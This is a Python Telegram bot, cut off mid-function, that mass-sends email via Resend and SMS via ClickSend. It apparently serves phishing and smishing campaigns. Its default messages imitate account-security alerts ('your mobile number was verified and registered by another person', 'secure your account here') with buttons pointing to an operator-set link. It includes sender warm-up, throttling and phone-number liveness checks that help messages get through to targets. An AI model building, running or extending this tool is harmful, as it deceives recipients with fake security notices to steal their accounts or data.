import os
import re
import json
import time
import html
import asyncio
import logging
import functools
from pathlib import Path
from typing import List, Dict, Any, Optional

import requests
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)

BASE_DIR = Path(__file__).parent
STATE_FILE = BASE_DIR / "state.json"
LOG_FILE = BASE_DIR / "campaign_log.json"

BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
RESEND_API_KEY = os.getenv("RESEND_API_KEY", "").strip()   # ← Resend API key
SENDER_NAME = os.getenv("SENDER_NAME", "My Company").strip()
SENDER_EMAIL = os.getenv("SENDER_EMAIL", "").strip()
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "").strip()
WEBSITE_LINK = os.getenv("WEBSITE_LINK", "").strip()

# ClickSend SMS credentials
CLICKSEND_USERNAME = os.getenv("CLICKSEND_USERNAME", "").strip()
CLICKSEND_API_KEY = os.getenv("CLICKSEND_API_KEY", "").strip()
CLICKSEND_SENDER = os.getenv("CLICKSEND_SENDER", "TruckForSaleUSA").strip()

DEFAULT_SUBJECT = os.getenv("DEFAULT_SUBJECT", "Important update from My Company").strip()
BATCH_SIZE = int(os.getenv("BATCH_SIZE", "50"))
BATCH_DELAY_SECONDS = int(os.getenv("BATCH_DELAY_SECONDS", "180"))
DAILY_LIMIT = int(os.getenv("DAILY_LIMIT", "300"))
MAX_FAILURES = int(os.getenv("MAX_FAILURES", "15"))

# Hourly rate limit: max emails per hour (0 = unlimited)
HOURLY_LIMIT_DEFAULT = int(os.getenv("HOURLY_LIMIT", "0"))

EMAIL_REGEX = re.compile(r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$")

DEFAULT_BODY = """Hi there,\n\nWe wanted to let you know that your mobile number was verified and registered by another person on My Company.\n\nThis mobile number is still associated with your account. If you're still receiving SMS notifications from My Company, the person who just confirmed may also see future My Company SMS notifications sent to this number.\n\nIf you'd like to continue to keep this number on your account, click the Keep Number button.\n\nIf you'd like to make changes to your mobile number, click the Update Number button.\n\nIf you no longer use or do not have access to this phone number, please update your phone information or remove this number from your account.\n"""

# ---------------------------------------------------------------------------
# State helpers
# ---------------------------------------------------------------------------

def default_state() -> Dict[str, Any]:
    return {
        "emails": [],
        "subject": DEFAULT_SUBJECT,
        "body": DEFAULT_BODY,
        "button1_text": "Keep Number",
        "button1_link": WEBSITE_LINK,
        "button2_text": "Update Number",
        "button2_link": WEBSITE_LINK,
        "paused": False,
        "sending": False,
        "campaign_task_running": False,
        "last_run": {
            "sent": 0,
            "failed": 0,
            "skipped": 0,
            "total": 0,
            "last_error": ""
        },
        "daily_sent_count": 0,
        "daily_sent_date": "",
        # --- Hourly rate limiting ---
        "hourly_limit": HOURLY_LIMIT_DEFAULT,   # 0 = no limit
        "hourly_sent_count": 0,
        "hourly_window_start": "",              # ISO timestamp of current window
        # ----------------------------
        "failed_emails": [],
        "sent_emails": [],
        # SMS
        "phones": [],
        "sms_message": "We noticed a request to update the phone number on your account. If this wasn't you, secure your account here: https://truckforsaleusa.com\n\nReply STOP to unsubscribe.",
        "sent_phones": [],
        "failed_phones": [],
        # Multi-admin
        "extra_admins": [],
        # Unsubscribe tracker
        "unsubscribed_emails": [],
        "unsubscribed_phones": [],
        # Warm-up mode
        "warmup_enabled": False,
        "warmup_day": 1,
        "warmup_start_date": "",
        # Scheduler
        "scheduled_time": "",        # "HH:MM" 24h format
        "scheduled_type": "",        # "email" | "sms" | "both"
        "scheduler_enabled": False,
    }

def load_state() -> Dict[str, Any]:
    if STATE_FILE.exists():
        try:
            data = json.loads(STATE_FILE.read_text(encoding="utf-8"))
            # Back-fill keys added after first run
            defaults = default_state()
            for key, val in defaults.items():
                data.setdefault(key, val)
            return data
        except Exception:
            logging.exception("Failed to load state file")
    state = default_state()
    save_state(state)
    return state

def save_state(state: Dict[str, Any]) -> None:
    STATE_FILE.write_text(json.dumps(state, indent=2), encoding="utf-8")

def append_log(entry: Dict[str, Any]) -> None:
    logs = []
    if LOG_FILE.exists():
        try:
            logs = json.loads(LOG_FILE.read_text(encoding="utf-8"))
        except Exception:
            logging.exception("Failed to load campaign log")
    logs.append(entry)
    LOG_FILE.write_text(json.dumps(logs, indent=2), encoding="utf-8")

# ---------------------------------------------------------------------------
# Rate-limit helpers
# ---------------------------------------------------------------------------

def reset_daily_counter_if_needed(state: Dict[str, Any]) -> None:
    today = time.strftime("%Y-%m-%d")
    if state.get("daily_sent_date") != today:
        state["daily_sent_date"] = today
        state["daily_sent_count"] = 0

def reset_hourly_counter_if_needed(state: Dict[str, Any]) -> None:
    """Reset the hourly window counter if an hour has passed."""
    now = time.time()
    window_start = state.get("hourly_window_start")
    if not window_start:
        state["hourly_window_start"] = str(now)
        state["hourly_sent_count"] = 0
        return
    try:
        elapsed = now - float(window_start)
    except ValueError:
        elapsed = 9999
    if elapsed >= 3600:
        state["hourly_window_start"] = str(now)
        state["hourly_sent_count"] = 0

def seconds_until_next_hour_window(state: Dict[str, Any]) -> int:
    """Return seconds remaining in the current hourly window."""
    try:
        elapsed = time.time() - float(state.get("hourly_window_start", 0))
        remaining = max(0, 3600 - int(elapsed))
        return remaining
    except Exception:
        return 3600

def hourly_limit_reached(state: Dict[str, Any]) -> bool:
    limit = state.get("hourly_limit", 0)
    if limit <= 0:
        return False
    return state.get("hourly_sent_count", 0) >= limit

# ---------------------------------------------------------------------------
# Admin / auth
# ---------------------------------------------------------------------------

def is_admin(update: Update) -> bool:
    if not update.effective_chat:
        return False
    chat_id = str(update.effective_chat.id)
    if not ADMIN_CHAT_ID:
        return True
    if chat_id == str(ADMIN_CHAT_ID):
        return True
    # Check extra admins stored in state
    try:
        state = load_state()
        return chat_id in [str(x) for x in state.get("extra_admins", [])]
    except Exception:
        return False

def require_admin(func):
    @functools.wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update):
            if update.effective_message:
                await update.effective_message.reply_text("Unauthorized.")
            return
        return await func(update, context)
    return wrapper

# ---------------------------------------------------------------------------
# Email helpers
# ---------------------------------------------------------------------------

def extract_emails(text: str) -> List[str]:
    if not text:
        return []
    parts = re.split(r"[\s,;\n\r\t]+", text.strip())
    emails = []
    for part in parts:
        email = part.strip().lower()
        if email and EMAIL_REGEX.match(email):
            emails.append(email)
    return emails

def dedupe_keep_order(items: List[str]) -> List[str]:
    seen = set()
    result = []
    for item in items:
        if item not in seen:
            seen.add(item)
            result.append(item)
    return result

# ---------------------------------------------------------------------------
# HTML email builder
# ---------------------------------------------------------------------------

def build_email_html(body: str, button1_text: str, button1_link: str,
                     button2_text: str, button2_link: str) -> str:
    escaped_body = html.escape(body).replace("\n", "<br>")
    button1 = ""
    button2 = ""

    if button1_text and button1_link:
        button1 = f"""\n        <tr>\n          <td align="center" style="padding-bottom: 14px;">\n            <a href="{html.escape(button1_link, quote=True)}"\n               style="display:inline-block;background:#2d7ff9;color:#ffffff;text-decoration:none;
                      padding:16px 28px;border-radius:10px;font-size:18px;font-family:Arial,sans-serif;">\n              {html.escape(button1_text)}\n            </a>\n          </td>\n        </tr>"""

    if button2_text and button2_link:
        button2 = f"""\n        <tr>\n          <td align="center">\n            <a href="{html.escape(button2_link, quote=True)}"\n               style="display:inline-block;background:#222222;color:#ffffff;text-decoration:none;
                      padding:16px 28px;border-radius:10px;font-size:18px;font-family:Arial,sans-serif;">\n              {html.escape(button2_text)}\n            </a>\n          </td>\n        </tr>"""

    return f"""<!DOCTYPE html>\n<html>\n<head><meta charset="UTF-8"><title>My Company</title></head>\n<body style="margin:0;padding:0;background:#f2f2f2;font-family:Arial,sans-serif;">\n  <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f2f2f2;padding:40px 0;">\n    <tr><td align="center">\n      <table width="600" cellpadding="0" cellspacing="0" border="0"\n             style="background:#ffffff;border-radius:12px;padding:40px;max-width:600px;">\n        <tr><td style="font-size:40px;font-weight:bold;color:#000000;padding-bottom:24px;">\n          Important account update\n        </td></tr>\n        <tr><td style="font-size:20px;color:#111111;padding-bottom:20px;">Hello,</td></tr>\n        <tr><td style="font-size:17px;line-height:1.7;color:#333333;padding-bottom:30px;">\n          {escaped_body}\n        </td></tr>\n        {button1}\n        {button2}\n        <tr><td style="font-size:13px;color:#666666;line-height:1.6;padding-top:30px;">\n          Sent by {html.escape(SENDER_NAME)} • {html.escape(SENDER_EMAIL)}\n        </td></tr>\n      </table>\n    </td></tr>\n  </table>\n</body>\n</html>"""

# ---------------------------------------------------------------------------
# Resend transactional send
# ---------------------------------------------------------------------------

def send_resend_email(to_email: str, subject: str, html_content: str) -> requests.Response:
    """\n    Send a single email via Resend API.\n    Docs: https://resend.com/docs/api-reference/emails/send-email\n    """
    url = "https://api.resend.com/emails"
    headers = {
        "Authorization": f"Bearer {RESEND_API_KEY}",
        "Content-Type": "application/json",
    }
    # Build from field safely
    sender_name = SENDER_NAME.strip().replace("<", "").replace(">", "").replace('"', "")
    from_field = f"{sender_name} <{SENDER_EMAIL}>" if sender_name else SENDER_EMAIL
    payload = {
        "from": from_field,
        "to": [to_email],
        "subject": subject,
        "html": html_content,
    }
    return requests.post(url, json=payload, headers=headers, timeout=30)

# ---------------------------------------------------------------------------
# ClickSend SMS sender
# ---------------------------------------------------------------------------

def send_clicksend_sms(to_phone: str, message: str) -> requests.Response:
    """\n    Send a single SMS via ClickSend API.\n    Docs: https://developers.clicksend.com/docs/rest/v3/#send-sms\n    """
    import base64
    url = "https://rest.clicksend.com/v3/sms/send"
    credentials = base64.b64encode(
        f"{CLICKSEND_USERNAME}:{CLICKSEND_API_KEY}".encode()
    ).decode()
    headers = {
        "Authorization": f"Basic {credentials}",
        "Content-Type": "application/json",
    }
    payload = {
        "messages": [
            {
                "source": "python",
                "from": CLICKSEND_SENDER,
                "body": message,
                "to": to_phone,
            }
        ]
    }
    return requests.post(url, json=payload, headers=headers, timeout=30)

def extract_phones(text: str):
    if not text:
        return []
    parts = re.split(r"[\s,;\n\r\t]+", text.strip())
    phones = []
    for part in parts:
        p = part.strip()
        p_clean = re.sub(r"[^\d+]", "", p)
        if re.match(r"^\+?1?\d{10}$", p_clean):
            digits = re.sub(r"\D", "", p_clean)
            if len(digits) == 10:
                digits = "1" + digits
            phones.append("+" + digits)
    return phones

def validate_phone_clicksend(phone: str) -> dict:
    """\n    Validate a phone number using ClickSend HLR lookup.\n    Returns dict with keys: valid (bool), type (str), error (str)\n    """
    import base64
    try:
        credentials = base64.b64encode(
            f"{CLICKSEND_USERNAME}:{CLICKSEND_API_KEY}".encode()
        ).decode()
        url = f"https://rest.clicksend.com/v3/hlr/send"
        headers = {
            "Authorization": f"Basic {credentials}",
            "Content-Type": "application/json",
        }
        payload = {
            "messages": [
                {
                    "to": phone,
                    "source": "python"
                }
            ]
        }
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            msg = data.get("data", {}).get("messages", [{}])[0]
            status = msg.get("status", "").upper()
            # DELIVRD or ACCEPTED means number is valid and active
            if status in ("DELIVRD", "ACCEPTED", "SUCCESS"):
                return {"valid": True, "type": "mobile", "error": ""}
            else:
                return {"valid": False, "type": "unknown", "error": status}
        else:
            # If HLR fails, fall back to accepting the number
            return {"valid": True, "type": "unknown", "error": ""}
    except Exception as e:
        # On error, accept the number to avoid blocking valid ones
        return {"valid": True, "type": "unknown", "error": str(e)}

# ---------------------------------------------------------------------------
# Telegram command handlers
# ---------------------------------------------------------------------------

@require_admin
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id if update.effective_chat else "unknown"
    text = (
        "✨ *EMAIL SPENDER* ✨\n"
        "_Elite Email Campaign Manager — Resend Edition_\n\n"
        f"🆔 *Chat ID:* `{chat_id}`\n\n"
        "📋 *CAMPAIGN SETUP*\n"
        "┣ /addemails — Import email list\n"
        "┣ /setsubject — Configure subject\n"
        "┣ /setmessage — Craft your message\n"
        "┣ /setbutton1 — Primary CTA button\n"
        "┗ /setbutton2 — Secondary CTA button\n\n"
        "⏱ *RATE CONTROLS* _(anti-spam)_\n"
        "┣ /sethourlylimit — Max emails per hour\n"
        "┗ /ratelimitstatus — View current limits\n\n"
        "🚀 *CAMPAIGN LAUNCH*\n"
        "┣ /preview — Review before sending\n"
        "┣ /testsend — Send test email\n"
        "┗ /sendcampaign — Launch campaign\n\n"
        "⚙️ *CONTROLS*\n"
        "┣ /pause — Pause campaign\n"
        "┣ /resume — Resume campaign\n"
        "┣ /status — Live statistics\n"
        "┗ /clearemails — Reset email list\n\n"
        "📱 *SMS CAMPAIGN*\n"
        "┣ /addphones — Add phone numbers\n"
        "┣ /setsms — Set SMS message\n"
        "┣ /previewsms — Preview SMS\n"
        "┣ /testsms — Send test SMS\n"
        "┣ /sendtexts — Send to all phones\n"
        "┗ /clearphones — Clear phone list\n\n"
        "📊 *DASHBOARD & HISTORY*\n"
        "┣ /dashboard — Full stats overview\n"
        "┣ /history — Past campaigns\n"
        "┣ /exportemails — Download email list\n"
        "┣ /exportphones — Download phone list\n"
        "┗ /exporthistory — Download full history\n\n"
        "🔐 *ADMIN*\n"
        "┣ /addadmin — Add admin\n"
        "┣ /removeadmin — Remove admin\n"
        "┗ /listadmins — List all admins\n\n"
        "🚫 *UNSUBSCRIBE*\n"
        "┣ /unsubscribed — View list\n"
        "┗ /unsub — Add to unsub list\n\n"
        "⏰ *SCHEDULER*\n"
        "┣ /setschedule — Auto send daily\n"
        "┣ /stopschedule — Stop scheduler\n"
        "┗ /schedulestatus — Scheduler status\n\n"
        "🔥 *WARM-UP MODE*\n"
        "┣ /enablewarmup — Start warm-up\n"
        "┣ /disablewarmup — Stop warm-up\n"
        "┗ /warmupstatus — Warm-up status\n\n"
        "🧹 *TOOLS*\n"
        "┗ /cleanduplicates — Remove duplicates\n\n"
        "💎 _Powered by Resend & ClickSend_"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

@require_admin
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

@require_admin
async def addemails(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    text = update.message.text or ""
    payload = text.replace("/addemails", "", 1).strip()
    emails = extract_emails(payload)
    if not emails:
        await update.message.reply_text(
            "No valid email addresses found.\n\nUsage:\n/addemails email1@gmail.com, email2@gmail.com"
        )
        return
    combined = dedupe_keep_order(state["emails"] + emails)
    added_count = len(combined) - len(state["emails"])
    state["emails"] = combined
    save_state(state)
    await update.message.reply_text(
        f"✅ Added {added_count} emails.\n"
        f"📧 Total stored: {len(state['emails'])}"
    )

@require_admin
async def clearemails(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    state["emails"] = []
    state["sent_emails"] = []
    state["failed_emails"] = []
    save_state(state)
    await update.message.reply_text("✅ Email list cleared.")

@require_admin
async def setsubject(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    payload = update.message.text.replace("/setsubject", "", 1).strip()
    if not payload:
        await update.message.reply_text("Usage:\n/setsubject Your subject here")
        return
    state["subject"] = payload
    save_state(state)
    await update.message.reply_text(f"✅ Subject updated:\n{payload}")

@require_admin
async def setmessage(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    payload = update.message.text.replace("/setmessage", "", 1).strip()
    if not payload:
        await update.message.reply_text("Usage:\n/setmessage Your message here")
        return
    state["body"] = payload
    save_state(state)
    await update.message.reply_text("✅ Message updated.")

@require_admin
async def setbutton1(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    payload = update.message.text.replace("/setbutton1", "", 1).strip()
    if "|" not in payload:
        await update.message.reply_text("Usage:\n/setbutton1 Button Text | https://example.com")
        return
    text_part, link_part = [x.strip() for x in payload.split("|", 1)]
    state["button1_text"] = text_part
    state["button1_link"] = link_part
    save_state(state)
    await update.message.reply_text(f"✅ Button 1 updated:\n{text_part} -> {link_part}")

@require_admin
async def setbutton2(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    payload = update.message.text.replace("/setbutton2", "", 1).strip()
    if "|" not in payload:
        await update.message.reply_text("Usage:\n/setbutton2 Button Text | https://example.com")
        return
    text_part, link_part = [x.strip() for x in payload.split("|", 1)]
    state["button2_text"] = text_part
    state["button2_link"] = link_part
    save_state(state)
    await update.message.reply_text(f"✅ Button 2 updated:\n{text_part} -> {link_part}")

# --- NEW: Hourly rate limit commands ---

@require_admin
async def sethourlylimit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """\n    /sethourlylimit 50   → send max 50 emails per hour\n    /sethourlylimit 0    → no hourly limit\n    """
    state = load_state()
    payload = update.message.text.replace("/sethourlylimit", "", 1).strip()
    if not payload.isdigit():
        await update.message.reply_text(
            "Usage:\n"
            "/sethourlylimit 50   — max 50 emails/hour\n"
            "/sethourlylimit 0    — no hourly limit"
        )
        return
    limit = int(payload)
    state["hourly_limit"] = limit
    # Reset the window so it starts fresh with the new limit
    state["hourly_sent_count"] = 0
    state["hourly_window_start"] = str(time.time())
    save_state(state)
    if limit == 0:
        await update.message.reply_text("✅ Hourly limit removed (unlimited).")
    else:
        await update.message.reply_text(
            f"✅ Hourly limit set to *{limit} emails/hour*.\n"
            f"The campaign will automatically wait when the limit is reached and resume when the hour resets.",
            parse_mode=ParseMode.MARKDOWN
        )

@require_admin
async def ratelimitstatus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    reset_hourly_counter_if_needed(state)
    reset_daily_counter_if_needed(state)
    save_state(state)

    hourly_limit = state.get("hourly_limit", 0)
    hourly_sent = state.get("hourly_sent_count", 0)
    secs_left = seconds_until_next_hour_window(state)
    mins_left = secs_left // 60

    text = (
        "⏱ *RATE LIMIT STATUS*\n\n"
        f"🕐 *Hourly limit:* {hourly_limit if hourly_limit > 0 else 'Unlimited'}\n"
        f"📤 *Sent this hour:* {hourly_sent}\n"
        f"⏳ *Hour resets in:* {mins_left}m {secs_left % 60}s\n\n"
        f"📅 *Daily limit:* {DAILY_LIMIT}\n"
        f"📊 *Sent today:* {state.get('daily_sent_count', 0)}\n\n"
        "_Use /sethourlylimit to change the hourly cap._"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

# --- Existing commands unchanged ---

@require_admin
async def preview(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    preview_text = (
        "👁 *CAMPAIGN PREVIEW*\n\n"
        f"📌 *Subject:*\n{state['subject']}\n\n"
        f"📝 *Message:*\n{state['body']}\n\n"
        f"🔵 *Button 1:*\n{state['button1_text']} -> {state['button1_link']}\n\n"
        f"⚫ *Button 2:*\n{state['button2_text']} -> {state['button2_link']}\n\n"
        f"📧 *Stored emails:* {len(state['emails'])}"
    )
    await update.message.reply_text(preview_text, parse_mode=ParseMode.MARKDOWN)

@require_admin
async def testsend(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    payload = update.message.text.replace("/testsend", "", 1).strip()
    emails = extract_emails(payload)
    if not emails:
        await update.message.reply_text("Usage:\n/testsend your@email.com")
        return
    test_email = emails[0]
    await update.message.reply_text(f"📤 Sending test email to {test_email}...")
    html_content = build_email_html(
        state["body"],
        state["button1_text"],
        state["button1_link"],
        state["button2_text"],
        state["button2_link"]
    )
    try:
        resp = send_resend_email(test_email, state["subject"], html_content)
        if 200 <= resp.status_code < 300:
            await update.message.reply_text(f"✅ Test email sent to {test_email}")
        else:
            await update.message.reply_text(
                f"❌ Test send failed.\nStatus: {resp.status_code}\nResponse: {resp.text[:500]}"
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ---------------------------------------------------------------------------
# Campaign runner (Resend + hourly rate limiting)
# ---------------------------------------------------------------------------

async def campaign_runner(app, chat_id: int):
    state = load_state()
    if state.get("campaign_task_running"):
        return

    state["campaign_task_running"] = True
    state["sending"] = True
    state["paused"] = False
    state["last_run"] = {
        "sent": 0,
        "failed": 0,
        "skipped": 0,
        "total": len(state["emails"]),
        "last_error": ""
    }
    save_state(state)
    reset_daily_counter_if_needed(state)
    reset_hourly_counter_if_needed(state)
    save_state(state)

    html_content = build_email_html(
        state["body"],
        state["button1_text"],
        state["button1_link"],
        state["button2_text"],
        state["button2_link"]
    )

    failure_count = 0
    sent_this_run = 0
    failed_emails = []
    sent_emails = []

    try:
        email_pool = dedupe_keep_order(state["emails"])
        unsent = [e for e in email_pool if e not in state.get("sent_emails", [])]

        if not unsent:
            state["sending"] = False
            state["campaign_task_running"] = False
            save_state(state)
            await app.bot.send_message(chat_id=chat_id, text="📭 No unsent emails left.")
            return

        hourly_limit = state.get("hourly_limit", 0)
        limit_info = f"⏱ Hourly limit: {hourly_limit if hourly_limit > 0 else 'None'}"

        await app.bot.send_message(
            chat_id=chat_id,
            text=(
                f"🚀 Campaign started!\n"
                f"📧 Total unsent: {len(unsent)}\n"
                f"📦 Batch size: {BATCH_SIZE}\n"
                f"⏱ Delay between batches: {BATCH_DELAY_SECONDS}s\n"
                f"{limit_info}"
            )
        )

        for i in range(0, len(unsent), BATCH_SIZE):
            state = load_state()

            if state.get("paused"):
                state["sending"] = False
                state["campaign_task_running"] = False
                save_state(state)
                await app.bot.send_message(chat_id=chat_id, text="⏸ Campaign paused.")
                return

            reset_daily_counter_if_needed(state)
            reset_hourly_counter_if_needed(state)
            save_state(state)

            if state["daily_sent_count"] >= DAILY_LIMIT:
                state["sending"] = False
                state["campaign_task_running"] = False
                save_state(state)
                await app.bot.send_message(
                    chat_id=chat_id,
                    text=f"🛑 Daily limit reached ({DAILY_LIMIT}). Resume tomorrow."
                )
                return

            batch = unsent[i:i + BATCH_SIZE]
            batch_sent = 0
            batch_failed = 0

            for email in batch:
                state = load_state()
                reset_daily_counter_if_needed(state)
                reset_hourly_counter_if_needed(state)

                if state["paused"]:
                    state["sending"] = False
                    state["campaign_task_running"] = False
                    save_state(state)
                    await app.bot.send_message(chat_id=chat_id, text="⏸ Campaign paused.")
                    return

                if state["daily_sent_count"] >= DAILY_LIMIT:
                    state["sending"] = False
                    state["campaign_task_running"] = False
                    save_state(state)
                    await app.bot.send_message(
                        chat_id=chat_id,
                        text=f"🛑 Daily limit reached ({DAILY_LIMIT}). Resume tomorrow."
                    )
                    return

                # --- Hourly rate limit check ---
                if hourly_limit_reached(state):
                    wait_secs = seconds_until_next_hour_window(state)
                    wait_mins = wait_secs // 60
                    await app.bot.send_message(
                        chat_id=chat_id,
                        text=(
                            f"⏳ Hourly limit of {state['hourly_limit']} reached.\n"
                            f"⏱ Waiting {wait_mins}m {wait_secs % 60}s for next window...\n"
                            f"_(Campaign will resume automatically)_"
                        ),
                        parse_mode=ParseMode.MARKDOWN
                    )
                    await asyncio.sleep(wait_secs + 5)   # +5s buffer
                    state = load_state()
                    reset_hourly_counter_if_needed(state)
                    save_state(state)
                    await app.bot.send_message(
                        chat_id=chat_id,
                        text="▶️ Hourly window reset — resuming sends."
                    )

                try:
                    resp = send_resend_email(email, state["subject"], html_content)
                    if 200 <= resp.status_code < 300:
                        sent_this_run += 1
                        batch_sent += 1
                        state["daily_sent_count"] += 1
                        state["hourly_sent_count"] = state.get("hourly_sent_count", 0) + 1
                        state["sent_emails"] = dedupe_keep_order(
                            state.get("sent_emails", []) + [email]
                        )
                        save_state(state)
                        sent_emails.append(email)
                    else:
                        batch_failed += 1
                        failure_count += 1
                        failed_emails.append({
                            "email": email,
                            "status": resp.status_code,
                            "response": resp.text[:300]
                        })
                        state["failed_emails"] = state.get("failed_emails", []) + [email]
                        state["last_run"]["last_error"] = f"{resp.status_code}: {resp.text[:200]}"
                        save_state(state)
                except Exception as e:
                    batch_failed += 1
                    failure_count += 1
                    failed_emails.append({"email": email, "status": "exception", "response": str(e)})
                    state["failed_emails"] = state.get("failed_emails", []) + [email]
                    state["last_run"]["last_error"] = str(e)
                    save_state(state)

                if failure_count >= MAX_FAILURES:
                    state["sending"] = False
                    state["campaign_task_running"] = False
                    state["last_run"]["sent"] = sent_this_run
                    state["last_run"]["failed"] = failure_count
                    save_state(state)
                    await app.bot.send_message(
                        chat_id=chat_id,
                        text=f"🛑 Campaign stopped: too many failures ({failure_count})."
                    )
                    append_log({
                        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                        "result": "stopped_too_many_failures",
                        "sent": sent_this_run,
                        "failed": failure_count,
                        "failed_emails": failed_emails,
                    })
                    return

            state = load_state()
            state["last_run"]["sent"] = sent_this_run
            state["last_run"]["failed"] = failure_count
            save_state(state)

            await app.bot.send_message(
                chat_id=chat_id,
                text=(
                    f"📦 Batch done!\n"
                    f"✅ Sent: {batch_sent}\n"
                    f"❌ Failed: {batch_failed}\n"
                    f"📊 Total sent: {sent_this_run}\n"
                    f"⚠️ Total failures: {failure_count}\n"
                    f"⏱ Sent this hour: {state.get('hourly_sent_count', 0)}"
                    + (f" / {state['hourly_limit']}" if state.get('hourly_limit', 0) > 0 else "")
                )
            )

            if i + BATCH_SIZE < len(unsent):
                await asyncio.sleep(BATCH_DELAY_SECONDS)

        state = load_state()
        state["sending"] = False
        state["campaign_task_running"] = False
        state["last_run"]["sent"] = sent_this_run
        state["last_run"]["failed"] = failure_count
        save_state(state)

        append_log({
            "time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "result": "completed",
            "sent": sent_this_run,
            "failed": failure_count,
            "failed_emails": failed_emails,
            "sent_emails_count": len(sent_emails),
        })

        await app.bot.send_message(
            chat_id=chat_id,
            text=(
                f"🎉 Campaign completed!\n"
                f"✅ Sent: {sent_this_run}\n"
                f"❌ Failed: {failure_count}"
            )
        )

    except Exception as e:
        state = load_state()
        state["sending"] = False
        state["campaign_task_running"] = False
        state["last_run"]["last_error"] = str(e)
        save_state(state)
        await app.bot.send_message(chat_id=chat_id, text=f"❌ Campaign crashed: {e}")

# ---------------------------------------------------------------------------
# Launch commands
# ---------------------------------------------------------------------------

@require_admin
async def sendcampaign(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    if not RESEND_API_KEY or not BOT_TOKEN or not SENDER_EMAIL:
        await update.message.reply_text("❌ Missing environment variables.")
        return
    if state.get("campaign_task_running"):
        await update.message.reply_text("⚠️ Campaign already running.")
        return
    if not state["emails"]:
        await update.message.reply_text("📭 No emails stored. Use /addemails first.")
        return
    app = context.application
    chat_id = update.effective_chat.id
    asyncio.create_task(campaign_runner(app, chat_id))
    await update.message.reply_text("🚀 Campaign launched!")

@require_admin
async def pause(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    state["paused"] = True
    state["sending"] = False
    save_state(state)
    await update.message.reply_text("⏸ Campaign paused.")

@require_admin
async def resume(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    if state.get("campaign_task_running"):
        await update.message.reply_text("⚠️ Campaign is already running.")
        return
    state["paused"] = False
    save_state(state)
    app = context.application
    chat_id = update.effective_chat.id
    asyncio.create_task(campaign_runner(app, chat_id))
    await update.message.reply_text("▶️ Campaign resumed!")

@require_admin
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    reset_hourly_counter_if_needed(state)
    save_state(state)

    hourly_limit = state.get("hourly_limit", 0)
    hourly_sent = state.get("hourly_sent_count", 0)
    secs_left = seconds_until_next_hour_window(state)

    text = (
        "📊 *CAMPAIGN STATUS*\n\n"
        f"📧 Stored emails: {len(state['emails'])}\n"
        f"📤 Sending: {state.get('sending')}\n"
        f"⏸ Paused: {state.get('paused')}\n"
        f"🔄 Running: {state.get('campaign_task_running')}\n\n"
        f"✅ Last run sent: {state['last_run'].get('sent', 0)}\n"
        f"❌ Last run failed: {state['last_run'].get('failed', 0)}\n\n"
        f"📅 Daily sent: {state.get('daily_sent_count', 0)} / {DAILY_LIMIT}\n"
        f"⏱ Hourly sent: {hourly_sent}"
        + (f" / {hourly_limit}" if hourly_limit > 0 else " (no limit)")
        + f"\n⏳ Hour resets in: {secs_left // 60}m {secs_left % 60}s\n\n"
        f"⚠️ Last error: {state['last_run'].get('last_error', '') or 'None'}"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

# ---------------------------------------------------------------------------
# Startup validation & main
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# SMS Telegram commands
# ---------------------------------------------------------------------------

@require_admin
async def addphones(update, context):
    state = load_state()
    text = update.message.text or ""
    payload = text.replace("/addphones", "", 1).strip()
    phones = extract_phones(payload)
    if not phones:
        await update.message.reply_text(
            "No valid phone numbers found.\n\nUsage:\n/addphones +12125551234, +13105559876"
        )
        return

    await update.message.reply_text(
        f"🔍 Validating {len(phones)} number(s)... please wait."
    )

    valid_phones = []
    invalid_phones = []

    for phone in phones:
        result = validate_phone_clicksend(phone)
        if result["valid"]:
            valid_phones.append(phone)
        else:
            invalid_phones.append(phone)

    if valid_phones:
        combined = dedupe_keep_order(state.get("phones", []) + valid_phones)
        added = len(combined) - len(state.get("phones", []))
        state["phones"] = combined
        save_state(state)

    msg = f"✅ Valid & added: {len(valid_phones)}\n"
    msg += f"❌ Invalid/dead: {len(invalid_phones)}\n"
    msg += f"📱 Total stored: {len(state.get('phones', []))}"
    if invalid_phones:
        msg += "\n\n🚫 Rejected numbers:\n" + "\n".join(invalid_phones)

    await update.message.reply_text(msg)

@require_admin
async def clearphones(update, context):
    state = load_state()
    state["phones"] = []
    state["sent_phones"] = []
    state["failed_phones"] = []
    save_state(state)
    await update.message.reply_text("✅ Phone list cleared.")

@require_admin
async def setsms(update, context):
    state = load_state()
    payload = update.message.text.replace("/setsms", "", 1).strip()
    if not payload:
